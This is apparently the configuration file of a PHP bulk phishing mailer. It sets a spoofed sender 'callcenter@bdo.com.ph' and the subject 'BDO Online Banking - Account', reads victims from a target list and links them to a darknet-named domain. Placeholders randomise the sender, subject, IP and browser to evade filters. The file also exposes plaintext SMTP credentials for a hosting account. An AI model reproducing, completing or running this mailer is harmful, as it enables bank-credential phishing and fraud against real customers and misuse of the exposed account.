<?php

$regards = "
$$$$$$$\  $$\   $$\  $$$$$$\   $$$$$$\  
$$  __$$\ $$ |  $$ |$$  __$$\ $$  __$$\ 
$$ |  $$ |$$ |  $$ |$$ /  \__|$$ /  $$ |
$$$$$$$  |$$$$$$$$ |$$$$$$$\  \$$$$$$$ |
$$  ____/ $$  __$$ |$$  __$$\  \____$$ |
$$ |      $$ |  $$ |$$ /  $$ |$$\   $$ |
$$ |      $$ |  $$ | $$$$$$  |\$$$$$$  |
\__|      \__|  \__| \______/  \______/ 
";

/*	
     		##email## : replace the contents of the letter to show the recipient's email
     		##subject## : Using random subject
     		##frommail## : Using random From mail
     		##fromname## : Using random From name
     		##short## : Using random your URL 
     		##country## : Using random country around the world
     		##date## : Using date time. (NOT RANDOM)
    		##OS## : Using random Operating Systems
    		##browser## : Using random Browsers
    		##randomip## : Using randomg IP
*/
	$userandom = 0;
	$sleeptime = 0;
	$mailist = "target.list";
	$fromname = "callcenter@bdo.com.ph";
	$frommail = "callcenter@bdo.com.ph";
	$subject = "BDO Online Banking - Account";
	$msgfile = "letter.html";
	$replacement = 1;
	$randurl = array("https://darknetphilippines.xyz");
	$userremoveline = 0;
	//=================SMTP=============================//
	$smtpserver = "box1383.bluehost.com";
	$smtpuser = "pepguruc@pepguru.com";
	$smtppass = "Pepguru@123";
	$smtpport = "26";
	$priority = 0;
	//==================================================//
    /* End */